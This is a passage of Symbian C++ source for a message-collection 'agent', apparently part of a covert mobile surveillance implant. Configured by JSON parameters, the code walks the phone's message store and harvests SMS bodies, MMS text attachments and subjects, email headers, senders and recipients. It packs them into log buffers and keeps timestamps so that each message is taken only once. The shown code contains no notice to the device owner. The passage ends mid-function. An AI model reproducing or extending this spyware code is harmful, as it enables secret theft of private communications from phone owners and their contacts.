/*
 ============================================================================
 Name		: AgentMessages.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentMessages implementation
 ============================================================================
 */

#include "AgentMessages.h"
#include <mmsconst.h>
#include <POPCMTM.H> 
#include <smut.h>
#include <msvapi.h>                     // CMsvSession
#include <mtclreg.h>                    // CClientMtmRegistry
#include <S32MEM.H>
#include <smuthdr.h>
#include <MMsvAttachmentManager.h>		// MMS attachments
#include <smsclnt.h>
#include <UTF.H>						// utf-unicode conversion
#include <CMsvMimeHeaders.h>
#include <f32file.h>					// RFs
#include <charconv.h>

#include <HT\TimeUtils.h>

#include <centralrepository.h>   //TODO: delete when done

_LIT(KClassSms,"IPM.SMSText*");
_LIT(KClassMail,"IPM.Note*");
_LIT(KClassMms,"IPM.MMS*");
_LIT(KUs, "Local");
_LIT(KNullDate, "0000-00-00 00:00:00");

enum TObjectType {
		EStringFolder           = 0x01000000,
		EStringClass            = 0x02000000,
		EStringFrom             = 0x03000000,
		EStringTo               = 0x04000000,
		EStringCc				= 0x05000000,
		EStringBcc              = 0x06000000,
		EStringSubject          = 0x07000000,

		EHeaderMapiV1           = 0x20000000,

		EObjectMIMEBody         = 0x80000000,
		EObjectTextBody			= 0x84000000,
		EObjectAttach           = 0x81000000,
		EObjectDeliveryTime     = 0x82000000,

		EExtended               = 0xFF000000, 		
	};


enum TMessageType
	{
	EUnknown = 0, ESMS, EMMS, ESMTP, EPOP3, EIMAP4
	};



CAgentMessages::CAgentMessages() :
	CAbstractAgent(EAgent_Messages)
	{
	// No implementation required
	}

CAgentMessages::~CAgentMessages()
	{
	__FLOG(_L("Destructor"));
	delete iLongTask;
	delete iFilter;
	delete iSelection;
	delete iSmsMtm;
	delete iMmsMtm;
	delete iMtmReg;   //jo
	delete iMsvSession;
	iMsvArray.Close();

	delete iSmsCollectFilter; 
    delete iSmsRuntimeFilter;
    delete iMmsCollectFilter;
	delete iMmsRuntimeFilter;
    delete iMailCollectFilter;
    delete iMailRuntimeFilter;
    
    delete iMarkupFile;
		
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentMessages* CAgentMessages::NewLC(const TDesC8& params)
	{
	CAgentMessages* self = new (ELeave) CAgentMessages();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentMessages* CAgentMessages::NewL(const TDesC8& params)
	{
	CAgentMessages* self = CAgentMessages::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}


void CAgentMessages::FillFilter(CMessageFilter* aFilter, const TAgentClassFilter aFilterHeader)
	{
	aFilter->iLog = aFilterHeader.iEnabled;
	if(aFilter->iLog)
		{
		aFilter->iSinceFilter = aFilterHeader.iDoFilterFromDate;
		aFilter->iUntilFilter = aFilterHeader.iDoFilterToDate;
		if (aFilter->iSinceFilter)
			{
			if(aFilterHeader.iHistory)
				{
				//collect data starting from datefrom
				aFilter->SetStartDate(aFilterHeader.iFromDate);
				}
			else
				{
				//do not collect data
				TTime now;
				now.UniversalTime();
				aFilter->SetStartDate(now);
				}
			}
		/*
		else 
			{
			_LIT(KInitialTime,"16010000:000000");

			TTime initialFiletime;
			initialFiletime.Set(KInitialTime);
			}
			*/
		if (aFilter->iUntilFilter) 
			{
			aFilter->SetEndDate(aFilterHeader.iToDate);
			}
		//message size, meaningful only for email messages
		aFilter->iMaxMessageBytesToLog = aFilterHeader.iMaxSize;  
		aFilter->iMaxMessageSize = aFilterHeader.iMaxSize;  
		}
	}

void CAgentMessages::GetFilterData(TAgentClassFilter& aFilter, const CJsonObject* aJsonObject)
	{
	if(aJsonObject->Find(_L("enabled")) != KErrNone)
		aJsonObject->GetBoolL(_L("enabled"),aFilter.iEnabled);
	if(aFilter.iEnabled)
		{
		CJsonObject* filterObject;
		aJsonObject->GetObjectL(_L("filter"),filterObject);
		//check history
		if(filterObject->Find(_L("history")) != KErrNotFound)
			filterObject->GetBoolL(_L("history"),aFilter.iHistory);
		// get date from
		TBuf<24> dateFrom;
		filterObject->GetStringL(_L("datefrom"),dateFrom);
		aFilter.iDoFilterFromDate = ETrue;
		aFilter.iFromDate = TimeUtils::GetSymbianDate(dateFrom);
		// get date to
		if(filterObject->Find(_L("dateto")) != KErrNotFound)
			{
			TBuf<24> dateTo;
			filterObject->GetStringL(_L("dateto"),dateTo);
			// check null date "0000-00-00 00:00:00"
			if(dateTo.Compare(KNullDate) == 0)
				{
				aFilter.iDoFilterToDate = EFalse;
				}
			else
				{
				aFilter.iDoFilterToDate = ETrue;
				aFilter.iToDate = TimeUtils::GetSymbianDate(dateTo);
				}
			//aFilter.iDoFilterToDate = ETrue;
			//aFilter.iToDate = TimeUtils::GetSymbianDate(dateTo);
			}
		// get max size
		if(filterObject->Find(_L("maxsize")) != KErrNotFound)
			filterObject->GetIntL(_L("maxsize"),aFilter.iMaxSize);
		}
	}

void CAgentMessages::ParseParameters(const TDesC8& aParams)
	{
	
	RBuf paramsBuf;
			
	TInt err = paramsBuf.Create(2*aParams.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(aParams);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
    CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
    CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		TAgentClassFilter smsFilter;
		TAgentClassFilter mmsFilter;
		TAgentClassFilter mailFilter;
		CleanupStack::PushL(rootObject);
		//get sms data
		if(rootObject->Find(_L("sms")) != KErrNotFound)
			{
			CJsonObject* smsObject;
			rootObject->GetObjectL(_L("sms"),smsObject);
			GetFilterData(smsFilter,smsObject);
			}
		FillFilter(iSmsRuntimeFilter,smsFilter);
		FillFilter(iSmsCollectFilter,smsFilter);
		//get mms data
		if(rootObject->Find(_L("mms")) != KErrNotFound)
			{
			CJsonObject* mmsObject;
			rootObject->GetObjectL(_L("mms"),mmsObject);
			GetFilterData(mmsFilter,mmsObject);
			}
		FillFilter(iMmsRuntimeFilter,mmsFilter);
		FillFilter(iMmsCollectFilter,mmsFilter);
		//get mail data
		if(rootObject->Find(_L("mail")) != KErrNotFound)
			{
			CJsonObject* mailObject;
			rootObject->GetObjectL(_L("mail"),mailObject);
			GetFilterData(mailFilter,mailObject);
			}
		FillFilter(iMailRuntimeFilter,mailFilter);
		FillFilter(iMailCollectFilter,mailFilter);
					
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
}

void CAgentMessages::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Messages.txt");
	__FLOG(_L("-------------"));
	
	iMmsCollectFilter = CMessageFilter::NewL(); 
	iMmsRuntimeFilter = CMessageFilter::NewL();
	iSmsCollectFilter = CMessageFilter::NewL(); 
	iSmsRuntimeFilter = CMessageFilter::NewL();
	iMailCollectFilter = CMessageFilter::NewL(); 
	iMailRuntimeFilter = CMessageFilter::NewL();
		
	ParseParameters(params);
	
	iLongTask = CLongTaskAO::NewL(*this);
	iMsvSession = CMsvSession::OpenSyncL(*this); // open the session with the synchronous primitive
	TBool present = iMsvSession->MessageStoreDrivePresentL();   // TODO: delete when done with testing = false
	TDriveUnit driveUnit = iMsvSession->CurrentDriveL();  // TODO: delete when done with testing
	TBool cont = iMsvSession->DriveContainsStoreL(EDriveC);  // TODO: delete when done with testing = true
	cont = iMsvSession->DriveContainsStoreL(EDriveE);  //TODO: delete when done with testing = false
	iFilter = CMsvEntryFilter::NewL();
	//iFilter->SetOrder(TMsvSelectionOrdering(KMsvNoGrouping, EMsvSortByNone, ETrue));       //TODO: delete when done with testing
	iSelection = new (ELeave) CMsvEntrySelection();
	
	iMtmReg = CClientMtmRegistry::NewL(*iMsvSession);  
	iMmsMtm = static_cast<CMmsClientMtm*>(iMtmReg->NewMtmL(KUidMsgTypeMultimedia));
	iSmsMtm = static_cast<CSmsClientMtm*>(iMtmReg->NewMtmL(KUidMsgTypeSMS));
		
	iMarkupFile = CLogFile::NewL(iFs);
	
	// check messaging memory  // TODO: delete when done with testing
					//MessagingInternalCRKeys.h
					const TUid KCRUidMuiuSettings = {0x101F87EB};
					const TUint32 KMuiuSentItemsCount = 0x00000001;
					const TUint32 KMuiuSentItemsInUse = 0x00000002;
					const TUint32 KMuiuMemoryInUse = 0x00000003;
					const TUint32 KMuiuToInputMode = 0x00000004;
					CRepository* repository = NULL;
					TRAPD( ret, repository = CRepository::NewL( KCRUidMuiuSettings ) );
					CleanupStack::PushL( repository );
								    
					if ( ret == KErrNone )
						{
						TInt currentDrive;
						ret = repository->Get( KMuiuMemoryInUse, currentDrive );
					    }
					CleanupStack::Pop( repository );
					delete repository;
		
	}

void CAgentMessages::PopulateArrayWithChildsTMsvIdEntriesL(TMsvId parentId)
	{
	iSelection->Reset();
	iMsvSession->GetChildIdsL(parentId, *iFilter, *iSelection);
	TInt count = iSelection->Count();  //TODO: delete when done
	for (int i = 0; i < iSelection->Count(); i++)
		{
		TMsvId msvId = iSelection->At(i);
		iMsvArray.Append(msvId);
		}
	}

void CAgentMessages::StartAgentCmdL()
	{
	// There is a file log for every message, so we don't open a file log here
	__FLOG(_L("START AGENT CMD"));
	iStopLongTask = EFalse;
	iMsvArray.Reset();
	iArrayIndex = 0;
	iMsvArray.Append(KMsvRootIndexEntryId);  
	
	// if markup exists, set iMarkup to that value and modify range into filters
	if(iMarkupFile->ExistsMarkupL(Type())){
		// retrieve markup
		// we add just a microsecond to the timestamp so that we are sure not to take 
		// the contact of the timestamp saved into markup
		TTimeIntervalMicroSeconds oneMicrosecond = 1;
		RBuf8 markupBuffer(iMarkupFile->ReadMarkupL(Type()));
		markupBuffer.CleanupClosePushL();
		Mem::Copy(&iMarkup,markupBuffer.Ptr(),sizeof(iMarkup));
		CleanupStack::PopAndDestroy(&markupBuffer);		
		if (iMailCollectFilter->iLog)
			iMailCollectFilter->ModifyFilterRange(iMarkup.mailMarkup+oneMicrosecond);
		/*
		if (iMailRuntimeFilter->iLog)
			iMailRuntimeFilter->ModifyFilterRange(iMarkup.mailMarkup+oneMicrosecond);
		*/
		if (iMmsCollectFilter->iLog)
			iMmsCollectFilter->ModifyFilterRange(iMarkup.mmsMarkup+oneMicrosecond);
		/*
		if (iMmsRuntimeFilter->iLog)
			iMmsRuntimeFilter->ModifyFilterRange(iMarkup.mmsMarkup+oneMicrosecond);
		*/
		if (iSmsCollectFilter->iLog)
			iSmsCollectFilter->ModifyFilterRange(iMarkup.smsMarkup+oneMicrosecond);
		/*
		if (iSmsRuntimeFilter->iLog)
			iSmsRuntimeFilter->ModifyFilterRange(iMarkup.smsMarkup+oneMicrosecond);
		*/
		
		} 
	else 
		{
			//TODO:see again this one
		_LIT(KInitTime,"16010000:000000");
		iMarkup.smsMarkup.Set(KInitTime);
		iMarkup.mmsMarkup.Set(KInitTime);
		iMarkup.mailMarkup.Set(KInitTime);
		}
	
	iLogNewMessages = ETrue;
	iLongTask->NextRound();
	}

void CAgentMessages::StopAgentCmdL()
	{
	__FLOG(_L("STOP AGENT CMD"));
	iLogNewMessages = EFalse;
	iStopLongTask = ETrue;
	}

void CAgentMessages::CycleAgentCmdL()
	{
	//nothing to be done, this is not an appending agent
	}

HBufC8* CAgentMessages::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
{

	TMAPISerializedMessageHeader serializedMsg;
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
		
	// set attachment number
	serializedMsg.iNumAttachs = 0;
			
	// set date in filetime format
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
			
	// insert folder name
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
			CleanupStack::PopAndDestroy(buffer);
			return HBufC8::New(0);
		}
	TUint8* ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	TUint32 typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size());
		
	// insert class
	typeAndLen = EStringClass;
	typeAndLen += KClassSms().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassSms().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassSms().Size());
	
	
	iSmsMtm->SwitchCurrentEntryL(aMsvId);
	iSmsMtm->LoadMessageL();
	// insert sender 
	typeAndLen = EStringFrom;
	typeAndLen += iSmsMtm->SmsHeader().FromAddress().Size();
	ptrData = (TUint8 *)iSmsMtm->SmsHeader().FromAddress().Ptr();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, iSmsMtm->SmsHeader().FromAddress().Size());
	// insert recipients:
	const MDesC16Array &array = iSmsMtm->AddresseeList().RecipientList();
	TInt count = array.MdcaCount();
	CBufBase* buf = CBufFlat::NewL(50);
	CleanupStack::PushL(buf);
	_LIT(KVirgola,",");
	for(TInt i = 0; i<count; i++)
		{
		ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
		buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
		if(i < (count-1))
			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
										
		}
	typeAndLen = EStringTo;
	typeAndLen += buf->Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), buf->Ptr(0), buf->Size());
	CleanupStack::PopAndDestroy(buf);																					
	
	// insert body
	// this code retrieves body larger than 256 characters:
	// http://discussion.forum.nokia.com/forum/showthread.php?146721-how-to-get-FULL-message-body-for-SMS/page2&highlight=mime+body
	CMsvEntry* cEntry = iMsvSession->GetEntryL(aMsvId);
	CleanupStack::PushL(cEntry);
	if (cEntry->HasStoreL())
		{
		CMsvStore *store = cEntry->ReadStoreL();
		CleanupStack::PushL(store);
			
		if (store->HasBodyTextL())
			{
			TInt length = iSmsMtm->Body().DocumentLength();
			
			HBufC* bodyBuf = HBufC::NewLC(length);
			
			TPtr ptr(bodyBuf->Des());
			iSmsMtm->Body().Extract(ptr,0,length);	
			typeAndLen = EStringSubject;
			typeAndLen += ptr.Size();
			buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
			ptrData = (TUint8 *)bodyBuf->Des().Ptr();
			buffer->InsertL(buffer->Size(), ptrData, bodyBuf->Des().Size());
			
			CleanupStack::PopAndDestroy(bodyBuf);
			
			}
		CleanupStack::PopAndDestroy(store);
		}
	CleanupStack::PopAndDestroy(cEntry);
	
	serializedMsg.iDwSize += buffer->Size();
	// insert the log structure 
	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
		
	HBufC8* result = buffer->Ptr(0).AllocL();
		
	CleanupStack::PopAndDestroy(buffer);
	
	// we set here the markup, the buffer is not zero and we know everything
	if(iMarkup.smsMarkup < aMsvEntryIdx.iDate){
		iMarkup.smsMarkup = aMsvEntryIdx.iDate;
	}
	return result;
	
}
	

HBufC8* CAgentMessages::GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
	{

	TMAPISerializedMessageHeader serializedMsg;
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	// TODO:remember to set real attachment number, see below in the body retrieval part
	serializedMsg.iNumAttachs = 0;
				
	// set date in filetime format
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
					
	// insert folder name
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
		CleanupStack::PopAndDestroy(buffer);
		return HBufC8::New(0);
		}
	TUint8* ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	TUint32 typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size());
			
	// insert class
	typeAndLen = EStringClass;
	typeAndLen += KClassMms().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassMms().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassMms().Size());
		
	// insert body
	CMsvEntry* entry = iMsvSession->GetEntryL(aMsvId); 	
	CleanupStack::PushL(entry);
	CMsvStore* store = entry->ReadStoreL(); 	
	if(store!= NULL) 	
	    { 		
	    CleanupStack::PushL(store); 		
	    MMsvAttachmentManager& attManager = store->AttachmentManagerL(); 		

		// TODO:set attachment number while working with attachment  manager 
		//serializedMsg.iNumAttachs = attManager.AttachmentCount();
	
	    _LIT8(KMimeBuf, "text/plain"); 			         
	    TBuf8<10>mimeBuf(KMimeBuf);
				
	    // Cycle through the attachments
	    for(TInt i=0; i<attManager.AttachmentCount(); i++) 			
	        { 			
	        CMsvAttachment* attachment = attManager.GetAttachmentInfoL(i); 			
	        CleanupStack::PushL(attachment); 			
			
	        // Test to see if we have a text file
	        if(mimeBuf.CompareF(attachment->MimeType())== 0) 				
	            {
				RFile file = attManager.GetAttachmentFileL(i);
	        	            
	        	// The file can then be read using the normal file functionality
	        	// After reading, the file should be closed
	        	TInt fileSize = 0;
	        	User::LeaveIfError(file.Size(fileSize));
	        	            
	        	HBufC8* fileBuf8 = HBufC8::NewLC(fileSize);
	        	TPtr8 bufPtr = fileBuf8->Des();
	        	User::LeaveIfError(file.Read(bufPtr, fileSize));
	        	file.Close();
	        	
				
	        	/*
	        	// correspondances TUint-charset are IANA MIBenum:
	        	// http://www.iana.org/assignments/character-sets
	        	// this code isn't working: 
	        	// - CMsvMimeHeaders::MimeCharset provides you the assigned number from IANA
				// - CCnvCharacterSetConverter::PrepareToConvertToOrFromL expects the UID of a converter implementation - from charconv.h (like KCharacterSetIdentifierUtf8=0x1000582d, for UTF8) 
	        	// but this mechanism could be used to provide specific decoding scheme for specific character sets....
	        	// at this moment i only provide for UTF-8 in the part  of code not commented 
				CMsvMimeHeaders* mimeHeaders = CMsvMimeHeaders::NewLC();
				mimeHeaders->RestoreL(*attachment);
				TUint charset = 0;
				charset	= mimeHeaders->MimeCharset();
				CleanupStack::PopAndDestroy(mimeHeaders);
	        
				// Set up file server session
				RFs fileServerSession;
				fileServerSession.Connect();
				CCnvCharacterSetConverter* CSConverter = CCnvCharacterSetConverter::NewLC();
				if (CSConverter->PrepareToConvertToOrFromL(charset,fileServerSession) != 
				            CCnvCharacterSetConverter::EAvailable)
				{
					//CSConverter->PrepareToConvertToOrFromL(charset,fileServerSession);
					User::Leave(KErrNotSupported);
				}
				// Create a buffer for the unconverted text - initialised with the input descriptor
				TPtrC8 remainderOfForeignText(fileBuf8->Des());
				// Create a "state" variable and initialise it with CCnvCharacterSetConverter::KStateDefault
				// After initialisation the state variable must not be tampered with.
				// Simply pass into each subsequent call of ConvertToUnicode()
				TInt state=CCnvCharacterSetConverter::KStateDefault;
				
				HBufC* unicodeText = HBufC::NewLC(fileSize*2);
				TPtr unicodeTextPtr = unicodeText->Des();
				for(;;)  // conversion loop
				{
					const TInt returnValue = CSConverter->ConvertToUnicode(unicodeTextPtr,remainderOfForeignText,state);
				    if (returnValue <= 0) // < error
				    {
				       break;
				    }
				    remainderOfForeignText.Set(remainderOfForeignText.Right(returnValue));
				}
				
				typeAndLen = EStringSubject;
				typeAndLen += unicodeText->Size();
				buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
				ptrData = (TUint8 *)unicodeText->Ptr();
				buffer->InsertL(buffer->Size(), ptrData, unicodeText->Size());
					            
				
				CleanupStack::PopAndDestroy(unicodeText);

				CleanupStack::PopAndDestroy(CSConverter);
				fileServerSession.Close();

				*/
	        	
	        	CMsvMimeHeaders* mimeHeaders = CMsvMimeHeaders::NewLC();
	        	mimeHeaders->RestoreL(*attachment);
	        	TUint charset = mimeHeaders->MimeCharset();
	        	CleanupStack::PopAndDestroy(mimeHeaders);  
	        		        	
	        	if(charset == 0x6a)   // 0x6a = UTF-8  // other charsets can be added below with if statements
	        	{	
					
					RBuf unicodeBuf(CnvUtfConverter::ConvertToUnicodeFromUtf8L(bufPtr));
					unicodeBuf.CleanupClosePushL();
					typeAndLen = EObjectTextBody;   
					typeAndLen += unicodeBuf.Size();
					buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
					ptrData = (TUint8 *)unicodeBuf.Ptr();
					buffer->InsertL(buffer->Size(), ptrData, unicodeBuf.Size());
					CleanupStack::PopAndDestroy(&unicodeBuf);
					            	
	        	}
	        	CleanupStack::PopAndDestroy(fileBuf8);
	        		        	
	            }
	        CleanupStack::PopAndDestroy(attachment);
	        }
	    CleanupStack::PopAndDestroy(store);
	    }  
	CleanupStack::PopAndDestroy(entry);
	
	iMmsMtm->SwitchCurrentEntryL(aMsvId);
	iMmsMtm->LoadMessageL();
	
	// insert subject	
	typeAndLen = EStringSubject;
	typeAndLen += iMmsMtm->SubjectL().Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	ptrData = (TUint8 *)iMmsMtm->SubjectL().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->SubjectL().Size());
	
	// insert sender 
	typeAndLen = EStringFrom;
	typeAndLen += iMmsMtm->Sender().Size();
	ptrData = (TUint8 *)iMmsMtm->Sender().Ptr();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, iMmsMtm->Sender().Size());
	// insert recipients:
	const MDesC16Array &array = iMmsMtm->AddresseeList().RecipientList();
	TInt count = array.MdcaCount();
	CBufBase* buf = CBufFlat::NewL(50);
	CleanupStack::PushL(buf);
	_LIT(KVirgola,",");
	for(TInt i = 0; i<count; i++)
		{
		ptrData = (TUint8 *)array.MdcaPoint(i).Ptr();
		buf->InsertL(buf->Size(),ptrData,array.MdcaPoint(i).Size() );
		if(i < (count-1))
			buf->InsertL(buf->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
									
		}
	typeAndLen = EStringTo;
	typeAndLen += buf->Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), buf->Ptr(0), buf->Size());
	CleanupStack::PopAndDestroy(buf);																					
	
	serializedMsg.iDwSize += buffer->Size();
	
	// insert the log structure 
	buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
	HBufC8* result = buffer->Ptr(0).AllocL();
		
	CleanupStack::PopAndDestroy(buffer);
	
	// we set here the markup, the buffer is not zero and we know everything
	if(iMarkup.mmsMarkup < aMsvEntryIdx.iDate){
		iMarkup.mmsMarkup = aMsvEntryIdx.iDate;
	}

	return result;
	}


HBufC8* CAgentMessages::GetMailBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId, CMessageFilter* aFilter)
	{

	//TMAPISerializedMessageHeader serializedMsg;
	//CBufBase* buffer = CBufFlat::NewL(50);
	//CleanupStack::PushL(buffer);
	
	CBufBase* mailBuffer = CBufFlat::NewL(50);
	CleanupStack::PushL(mailBuffer);
		
	// TODO:set real attachment number when server ready
	//serializedMsg.iNumAttachs = 0;
				
	// set date in filetime format
	//TInt64 date = GetFiletime(aMsvEntryIdx.iDate);
	TInt64 date = TimeUtils::GetFiletime(aMsvEntryIdx.iDate);
	//serializedMsg.iDeliveryTime.dwHighDateTime = (date >> 32);
	//serializedMsg.iDeliveryTime.dwLowDateTime = (date & 0xFFFFFFFF);
	iMailRawAdditionalData.highDateTime = (date >> 32);
	iMailRawAdditionalData.lowDateTime = (date & 0xFFFFFFFF);
	
	TUint8* ptrData;
	//TUint32 typeAndLen;
	
	// insert folder name
	/*
	TMsvId service;
	TMsvId parentMsvId = aMsvEntryIdx.Parent();
	TMsvEntry parentEntry;
	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
	if (res!=KErrNone)
		{
		CleanupStack::PopAndDestroy(mailBuffer);
		CleanupStack::PopAndDestroy(buffer);
		return HBufC8::New(0);
		}
	ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
	typeAndLen = EStringFolder;
	typeAndLen += parentEntry.iDetails.Size();
	buffer->InsertL(buffer->Size(), &typeAndLen,sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, parentEntry.iDetails.Size()); */
	// insert class
	/*
	typeAndLen = EStringClass;
	typeAndLen += KClassMail().Size(); 
	buffer->InsertL(buffer->Size(),&typeAndLen,sizeof(typeAndLen));
	ptrData = (TUint8 *)KClassMail().Ptr();
	buffer->InsertL(buffer->Size(), ptrData, KClassMail().Size());
	*/
	CMsvEntry* entry = iMsvSession->GetEntryL(aMsvId); 	
	CleanupStack::PushL(entry);
	if(!(entry->HasStoreL()))
	{
		CleanupStack::PopAndDestroy(entry);
		CleanupStack::PopAndDestroy(mailBuffer);
		//CleanupStack::PopAndDestroy(buffer);
		return HBufC8::New(0);
	}
	else
	{	
		// insert everything else
		CImHeader* header = CImHeader::NewLC();
		CMsvStore* store = entry->ReadStoreL();
		CleanupStack::PushL(store);
		header->RestoreL(*store);
		CleanupStack::PopAndDestroy(store);
		
		// insert MessageId:
		_LIT8(KMsgId,"Message-ID: ");
		ptrData = (TUint8 *)KMsgId().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KMsgId().Size());
		ptrData = (TUint8 *)header->ImMsgId().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, header->ImMsgId().Size());
		// insert sender
		/*
		typeAndLen = EStringFrom;
		typeAndLen += header->From().Size();
		ptrData = (TUint8 *)header->From().Ptr();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, header->From().Size());
		*/
		// insert From: into mail buffer
		_LIT8(KFrom,"\r\nFrom: ");
		ptrData = (TUint8 *)KFrom().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KFrom().Size());
		//ptrData = (TUint8 *)header->From().Ptr();
		RBuf8 from8;
		from8.CreateL(header->From().Size());
		from8.CleanupClosePushL();
		from8.Copy(header->From());
		ptrData = (TUint8 *)from8.Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, from8.Size());
		CleanupStack::PopAndDestroy(&from8);
		// insert Date:
		_LIT8(KDate,"\r\nDate: ");
		ptrData = (TUint8 *)KDate().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KDate().Size());
		TTime date = aMsvEntryIdx.iDate;
		TBuf<50> dateString;
		_LIT(KDateString,"%F %E, %D %N %Y %H:%T:%S");
		date.FormatL(dateString,KDateString);
		TBuf8<100> dateString8;
		dateString8.Copy(dateString);
		// Thu, 13 May 2010 04:11
		ptrData = (TUint8 *)dateString8.Ptr();
		mailBuffer->InsertL(mailBuffer->Size(),ptrData,dateString8.Size());
		// insert subject
		/*
		typeAndLen = EStringSubject;
		typeAndLen += header->Subject().Size();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		ptrData = (TUint8 *)header->Subject().Ptr();
		buffer->InsertL(buffer->Size(), ptrData, header->Subject().Size());
		*/
		// insert Subject:
		_LIT8(KSubject, "\r\nSubject: ");
		ptrData = (TUint8 *)KSubject().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KSubject().Size());
		RBuf8 subject8;
		subject8.CreateL(header->Subject().Size());
		subject8.CleanupClosePushL();
		//ptrData = (TUint8 *)header->Subject().Ptr();
		subject8.Copy(header->Subject());
		ptrData = (TUint8 *)subject8.Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, subject8.Size());
		CleanupStack::PopAndDestroy(&subject8);
		// insert to
		const MDesC16Array &arrayTo = header->ToRecipients();
		TInt count = arrayTo.MdcaCount();
		CBufBase* bufTo = CBufFlat::NewL(50);
		CleanupStack::PushL(bufTo);
		CBufBase* bufTo8 = CBufFlat::NewL(50);  // this is necessary to re-create the MIME mail...
		CleanupStack::PushL(bufTo8);
		_LIT(KVirgola,", ");
		for(TInt i = 0; i<count; i++)
		{
			TBuf8<100> receiver;
			receiver.Copy(arrayTo.MdcaPoint(i));
			ptrData = (TUint8 *)arrayTo.MdcaPoint(i).Ptr();
			bufTo->InsertL(bufTo->Size(),ptrData,arrayTo.MdcaPoint(i).Size() );
			ptrData = (TUint8 *)receiver.Ptr();
			bufTo8->InsertL(bufTo8->Size(),ptrData,receiver.Size());
			if(i < (count-1))
			{
				bufTo->InsertL(bufTo->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
				bufTo8->InsertL(bufTo8->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
			}
		}
		/*
		typeAndLen = EStringTo;
		typeAndLen += bufTo->Size();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
